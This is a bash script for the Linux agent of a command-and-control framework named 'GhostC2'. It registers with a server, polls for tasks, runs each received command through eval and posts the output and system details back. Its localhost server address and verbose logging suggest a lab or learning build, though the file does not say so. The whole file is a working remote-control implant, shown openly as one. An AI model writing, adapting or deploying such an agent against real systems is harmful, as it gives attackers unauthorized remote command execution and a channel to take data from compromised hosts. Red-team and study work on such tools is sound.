#!/bin/bash

# GhostC2 Linux Agent
# This script acts as a Linux agent for the GhostC2 C2 framework

AGENT_ID="linux_agent_$(hostname)_$(date +%s)"
SERVER="http://localhost:8080"
INTERVAL=15  # seconds

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Logging function
log() {
    echo -e "${GREEN}[*]${NC} $1"
}

error() {
    echo -e "${RED}[!]${NC} $1"
}

warn() {
    echo -e "${YELLOW}[!]${NC} $1"
}

# Check if curl is available
if ! command -v curl &> /dev/null; then
    error "curl is required but not installed. Please install curl first."
    exit 1
fi

# Check if jq is available (for JSON parsing)
if ! command -v jq &> /dev/null; then
    warn "jq is not installed. JSON parsing will be limited."
    JQ_AVAILABLE=false
else
    JQ_AVAILABLE=true
fi

# Register agent with server
register_agent() {
    log "Registering agent with ID: $AGENT_ID"
    
    response=$(curl -s "$SERVER/register?id=$AGENT_ID" 2>/dev/null)
    if [ $? -eq 0 ]; then
        log "Successfully registered with server"
        return 0
    else
        error "Failed to register with server"
        return 1
    fi
}

# Get command from server
get_command() {
    response=$(curl -s "$SERVER/get-task?id=$AGENT_ID" 2>/dev/null)
    
    if [ $? -eq 0 ] && [ -n "$response" ]; then
        if [ "$JQ_AVAILABLE" = true ]; then
            command=$(echo "$response" | jq -r '.command // empty' 2>/dev/null)
        else
            # Basic parsing without jq
            command=$(echo "$response" | grep -o '"command":"[^"]*"' | cut -d'"' -f4)
        fi
        
        if [ -n "$command" ] && [ "$command" != "null" ]; then
            log "Received command: $command"
            echo "$command"
            return 0
        fi
    fi
    
    return 1
}

# Execute command and capture output
execute_command() {
    local cmd="$1"
    local output=""
    
    log "Executing: $cmd"
    
    # Execute command and capture both stdout and stderr
    output=$(eval "$cmd" 2>&1)
    local exit_code=$?
    
    log "Command exit code: $exit_code"
    log "Output length: ${#output} characters"
    
    # Add exit code to output
    if [ $exit_code -ne 0 ]; then
        output="Exit Code: $exit_code"$'\n'"$output"
    fi
    
    # If output is empty, add a note
    if [ -z "$output" ]; then
        output="Command executed successfully but produced no output."
    fi
    
    echo "$output"
}

# Send result to server
send_result() {
    local output="$1"
    
    # Properly escape the output for JSON
    local escaped_output=$(echo "$output" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g' | sed 's/\n/\\n/g' | sed 's/\r/\\r/g' | sed 's/\t/\\t/g')
    
    # Create JSON payload with proper escaping
    local json_data="{\"agent_id\":\"$AGENT_ID\",\"output\":\"$escaped_output\",\"time\":\"$(date '+%Y-%m-%d %H:%M:%S')\"}"
    
    log "Sending result for agent: $AGENT_ID"
    log "Output length: ${#output} characters"
    
    response=$(curl -s -X POST "$SERVER/submit-result" \
        -H "Content-Type: application/json" \
        -d "$json_data" 2>/dev/null)
    
    if [ $? -eq 0 ]; then
        log "Result sent successfully"
    else
        error "Failed to send result"
        error "Response: $response"
    fi
}

# Get system information
get_system_info() {
    echo "=== System Information ==="
    echo "Hostname: $(hostname)"
    echo "OS: $(uname -s)"
    echo "Kernel: $(uname -r)"
    echo "Architecture: $(uname -m)"
    echo "User: $(whoami)"
    echo "Current Directory: $(pwd)"
    echo "Shell: $SHELL"
    echo "Uptime: $(uptime)"
    echo "Memory: $(free -h | grep Mem | awk '{print $2}')"
    echo "Disk Usage: $(df -h / | tail -1 | awk '{print $5}')"
}

# Main loop
main() {
    log "GhostC2 Linux Agent Starting..."
    log "Agent ID: $AGENT_ID"
    log "Server: $SERVER"
    log "Polling interval: ${INTERVAL}s"
    
    # Display system information
    get_system_info
    
    # Register with server
    if ! register_agent; then
        error "Failed to register with server. Exiting."
        exit 1
    fi
    
    log "Starting command polling loop..."
    
    while true; do
        # Get command from server
        command=$(get_command)
        
        if [ $? -eq 0 ] && [ -n "$command" ]; then
            # Execute command
            output=$(execute_command "$command")
            
            # Send result back to server
            send_result "$output"
        fi
        
        # Wait before next poll
        sleep $INTERVAL
    done
}

# Handle script interruption
trap 'log "Agent stopped by user"; exit 0' INT TERM

# Check if server is reachable
if ! curl -s "$SERVER" >/dev/null 2>&1; then
    error "Cannot reach server at $SERVER"
    error "Make sure the GhostC2 server is running"
    exit 1
fi

# Start the agent
main
